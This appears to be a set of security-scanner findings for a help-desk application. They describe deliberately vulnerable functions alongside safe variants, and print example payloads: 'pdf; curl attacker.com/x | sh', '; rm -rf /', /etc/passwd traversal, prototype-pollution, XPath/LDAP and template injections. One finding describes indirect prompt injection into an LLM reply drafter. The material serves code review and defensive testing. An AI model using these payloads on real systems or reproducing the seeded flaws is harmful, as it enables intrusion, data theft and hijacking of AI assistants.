extra.message: The dashboard_timezone cookie is read from the request and interpolated directly into a raw SQL statement passed to $queryRawUnsafe() (SELECT ... AT TIME ZONE '${timezone}'). No parameter binding or validation is applied, so a crafted cookie value can break out of the quoted literal and inject arbitrary SQL.

renderCustomDigest passes the user-supplied reportType into runDigestScript with useShell=true, which builds `./scripts/render-digest.sh ${args.join(' ')}` and executes it via `bash -c` (line 29). An attacker-controlled template value such as `; rm -rf /` results in arbitrary OS command execution.

renderEscalationBriefWithLetterhead joins the user-supplied `letterhead` query parameter onto BRANDING_DIR and readFileSync()s the result with no containment check. `letterhead=../../../../etc/passwd` (or any absolute path) reads arbitrary files from the server.

cacheDigestForBookmark writes a file using `bookmarkLabel`, which comes from the attacker-controllable digest_bookmark cookie, with no basename/containment sanitization. A label like `../../server/critical` lets an authenticated lead write files outside DIGEST_CACHE_DIR.

renderEscalationBrief builds an HTML response by interpolating escalation.reason directly without HTML-escaping, unlike renderTicketSummary which uses escapeHtml(). Because the reason is free-form user input, this is stored/reflected XSS in the printable brief served with text/html.

The analytics_token query parameter is written straight into the X-Campaign-Correlation response header. CR/LF characters are not stripped (the -safe variant does this at line 81), enabling HTTP response header injection / response splitting.

cwe: CWE-113: HTTP Response Splitting / Header Injection

extra.message: normalizeIntakeForm interpolates the user-supplied presentationFormat body parameter into an execSync() shell command (`pandoc ... -t ${presentationFormat}`) with no allow-list. A value such as `pdf; curl attacker.com/x | sh` yields arbitrary command execution. The safe variant renderCaseFileBundle uses execFileSync with a fixed format allow-list.

lookupByCachedTrackingNumber interpolates the cached_tracking_number cookie value into an XPath expression without escaping. A value like `x' or '1'='1` rewrites the predicate and returns shipments outside the intended match. lookupByCachedTrackingNumberSafe escapes the value via escapeXPathString().

readRunbook joins the user-supplied fileName path parameter directly onto RUNBOOKS_DIR and reads it with readFileSync(), so `../../etc/passwd` escapes the runbooks directory and reads arbitrary files. readRunbookSafe() applies basename() before joining.

previewCitedReference fetches the arbitrary user-supplied sourceUrl with no scheme/host allow-list, enabling server-side request forgery against internal services (cloud metadata, localhost admin ports, etc.). previewApprovedReference restricts fetches to an allow-list of https partner hosts.

publicGetEmbed removes X-Frame-Options and sets `Content-Security-Policy: frame-ancestors *` whenever NODE_ENV !== 'production'. Any non-production/staging deployment of this public article endpoint can then be framed by an attacker for clickjacking/UI-redress.

cwe: CWE-1021: Improper Restriction of Rendered UI Layers / Clickjacking

extra.message: getTeamPolicyDocument joins the user-supplied fileName query parameter onto POLICY_DIR and readFileSync()s it without path containment. `fileName=../../../../etc/passwd` reads arbitrary files. getTeamPolicyDocumentSafe resolves and checks the path prefix.

getTeamWelcomePacket builds a file path from the team's stored name (`${team.name}.md`) and reads it without containment. Because team names are attacker-influenced (admin-created) and not restricted to safe characters, a name containing `../` can read files outside WELCOME_PACKET_DIR. getTeamWelcomePacketSafe resolves and prefix-checks the path.

loadApplicationConfig JSON.parses the attacker-controlled x-workspace-preferences header and Object.assign()s every key onto the config object. A payload such as `{"__proto__":{"polluted":true}}` mutates Object.prototype. loadApplicationConfigSafe only copies a fixed allow-list of keys.

previewDigestGreeting compiles the user-supplied `template` string with Handlebars.compile(), so an attacker can execute arbitrary Handlebars expressions/helpers server-side (server-side template injection). previewDigestGreetingSafe uses a fixed template and only accepts recipientName.

syncEscalationToCrm puts the CRM_API_KEY secret in the URL query string (`?api_key=${key}`), which leaks credentials into proxy/access logs, browser history and referrer headers. The newer syncContactToCrm sends the key in an Authorization header instead.

cwe: CWE-598: Use of GET Request Method With Sensitive Query Strings

extra.message: openFromDigest redirects to the attacker-controlled `return_to` query parameter with no allow-list, enabling open redirect / OAuth-style phishing. openFromDigestSafe restricts the destination to NOTIFICATION_HOME_SCREENS.

completeKioskVisit passes the unvalidated `returnTo` body field to res.redirect(), allowing an unauthenticated caller to redirect the kiosk to an arbitrary external site. completeFrontDeskVisit validates returnTo against BOOTH_SCREENS.

resumeKioskVisit reuses a client-supplied existing kiosk_visit id when it already exists, so a customer on a shared booth can inherit a prior visitor's verified session (session fixation / session hijack). beginKioskVisit always mints a fresh id and deletes the old one.

updatePortalProfile spreads the raw request body (`data: { ...updates }`) into organization.update(), so a customer_user can overwrite any Organization column (e.g. plan, notes, domain) rather than only the portal-exposed name/domain. updatePortalProfileSafe explicitly picks only name and domain.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: uploadBrandingLogo writes the uploaded file to join(BRANDING_WEB_DIR, file.originalname) using the raw client filename inside the web root. A filename like `../../public/x.js` or `shell.php` traverses out of the directory and/or writes an executable web file. uploadBrandingLogoSafe validates MIME/size and uses a randomUUID name under a private directory.

cwe: CWE-434: Unrestricted Upload of File with Dangerous Type

extra.message: processCostAllocationAssertion verifies the assertion with `algorithms: ['HS256','none']` (accepting unsigned tokens) and, on any verification failure, falls back to jwt.decode() and trusts the unverified claims. An attacker can forge a token to set arbitrary cost-center data. processAuditLogAssertion rejects the request when verification fails.

cwe: CWE-347: Improper Verification of Cryptographic Signature

extra.message: linkBillingAccount persists the full payer bank account number in cleartext in Organization.notes, exposing it to anyone who can read the org record. The analogous linkComplianceId encrypts the value with AtRestCipher before storing it.

cwe: CWE-312: Cleartext Storage of Sensitive Information

extra.message: redeemPortalInvite returns distinct errors for 'invite code not recognized' versus 'email does not match this invite', letting an unauthenticated caller enumerate valid organization IDs/domains. redeemPortalInviteVerified returns one generic error for both cases.

statusWidget reflects any request Origin into Access-Control-Allow-Origin together with Access-Control-Allow-Credentials: true, so any attacker site can make credentialed cross-origin reads of this public case-status endpoint. statusWidgetVerified only echoes the origin after matching the ticket organization's registered domain.

cwe: CWE-942: Permissive Cross-domain Policy with Untrusted Domains

extra.message: restoreWorkspaceLayout base64url-decodes the export code, JSON.parses it and spreads the result straight into prisma.user.update({ data: patch }). Any authenticated user can POST an export code containing `{"role":"support_admin"}` (or isActive/passwordHash/organizationId) to escalate privileges. restoreDisplayName whitelists only the fullName field.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: requestReset returns the raw single-use password-reset token (`devToken: token`) in the HTTP response to an unauthenticated caller. Anyone who can trigger a reset for a known email obtains a token that performReset accepts, enabling full account takeover.

cwe: CWE-640: Weak Password Recovery Mechanism for Forgotten Password

extra.message: requestBackupChannel returns the confirmation code (`devCode: code`) directly in the API response, so the out-of-band ownership proof is defeated: any caller can read the code and confirm a backup contact channel they do not control.

issueCoverageDelegateCredential signs a JWT with DELEGATE_ASSERTION_SECRET defaulting to the hardcoded literal 'dev-only-change-me-in-production'. If the env var is unset, any attacker who knows the default can forge coverage-delegation tokens and redeem them for another user's authority.

teamRoster returns full Prisma user rows (no `select`), including passwordHash and resetTokenHash, to a team lead. teamDirectory uses the SELECT projection that deliberately excludes the credential/reset-token columns.

cwe: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

extra.message: onboardSeasonalStaff hashes the temporary password with `dto.hashRounds || 4`, where hashRounds is an attacker-supplied request field. A caller can request 4 bcrypt rounds, making the stored password hashes trivial to brute-force. onboardSeasonalStaffVerified always uses 12 rounds.

cwe: CWE-916: Use of Password Hash With Insufficient Computational Effort

extra.message: previewUrgencyFormula passes the user-supplied `formula` into `new Function('metrics', \`return ${formula}\`)`, so a team lead can execute arbitrary JavaScript in the server process (e.g. `process.mainModule.require('child_process').execSync('id')`). scoreUrgencyByPreset only accepts fixed presets.

cwe: CWE-94: Improper Control of Generation of Code (Code Injection)

extra.message: acceptPartnerOwnershipHandoff parses the attacker-supplied x-partner-clearance header with parseInt and compares it using loose equality (`clearanceLevel == 5`), and treats a truthy (e.g. string 'true') entitlement response as access. A public caller can pass `x-partner-clearance: 5abc` and take ownership of any escalation. acceptPartnerOwnershipHandoffVerified uses Number.isInteger, strict ===, and a boolean check.

findEmployeeByBadgeId interpolates the user-supplied badgeId into an LDAP search filter (`(employeeId=${badgeId})`) without escaping. A value like `*)(objectClass=*` alters the filter structure and can return arbitrary directory entries. verifyGroupMembership applies escapeLdapFilter(); the same escaping should be applied here.

cwe: CWE-90: Improper Neutralization of Special Elements used in an LDAP Query

extra.message: checkSiteDispatchEligibility treats the directory's `access` field with loose equality (`record.access == true`), so a string value like '1' or 'true' from the external directory response is accepted as authorization. checkVerifiedSiteDispatchEligibility uses strict `=== true`.

checkCoverageApprovalAuthority trusts the directory's `isManager` flag with loose equality (`record.isManager == true`), so a string response value is accepted as manager standing for approving coverage delegation. checkCoverageApprovalAuthorityVerified uses strict equality and validates the parsed limit.

On a rejected API call the guard logs the entire request header object, which includes the caller's `x-api-key` secret (and any Authorization header). This writes live credentials into application logs.

cwe: CWE-532: Insertion of Sensitive Information into Log File

extra.message: ticket_batch_glitch_003 returns the raw exception stack trace to the caller (`detail: (err as Error).stack`), disclosing internal file paths, framework internals and query details to an authenticated client.

cwe: CWE-209: Generation of Error Message Containing Sensitive Information

extra.message: recordTicketSearchActivity writes the raw user-supplied search string into a log line, so embedded CR/LF lets an attacker forge additional log entries (log injection / forging). recordPortalSearchActivity strips `[\r\n\0]` before logging.

cwe: CWE-117: Improper Output Neutralization for Logs

extra.message: previewPartnerHandoff is exposed on a @Public() endpoint and decides whether to return internalNotes based solely on the client-supplied `membershipStatus` body field (`membershipStatus === 'enterprise'`). Any unauthenticated caller who knows a case reference can pass `enterprise` and read staff-only internal notes. previewPartnerHandoffVerified derives the tier from the organization record.

renderPortalCaseCard builds a Handlebars template by concatenating the user-controlled ticket.subject into the template source (`Subject: ${ticket.subject}`) and then compiles it with the internalNotes collection in scope. A customer can create a ticket whose subject is `{{#each internalNotes}}{{body}}{{/each}}` and retrieve staff-only internal notes via the portal-card endpoint.

importLegacyCase parses the attacker-supplied caseXml with xml2js without rejecting a DOCTYPE declaration. The equivalent KB importer (kb.service.ts:192) explicitly blocks `<!DOCTYPE` to prevent XML External Entity processing; this path omits that guard, exposing the parser to entity-expansion/XXE payloads.

cwe: CWE-611: Improper Restriction of XML External Entity Reference

extra.message: draftAgentReply concatenates the customer's latest message and the agent's priorFeedback directly into the instruction string sent to the LLM, so customer-controlled text can override the assistant's instructions (indirect prompt injection). draftAgentReplySafe passes customer content as a separate user message with an explicit system instruction to treat it as data.

cwe: CWE-1426: Improper Neutralization of AI Input

extra.message: runSavedSearch casts the raw request `criteria` object directly to a Prisma.TicketWhereInput and uses it in the query, letting a caller supply arbitrary nested filter operators/relation filters rather than a fixed set of fields. runCustomerSavedSearch restricts criteria to the SAVED_SEARCH_FIELDS allow-list.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: exportForComplianceReview runs an unbounded auditLog.findMany over an attacker-chosen date range (from/to query params) and loads the entire result set into memory. An admin can request a multi-year range and exhaust memory. exportForComplianceReviewPaginated caps the query at MAX_COMPLIANCE_EXPORT_ROWS with a cursor.
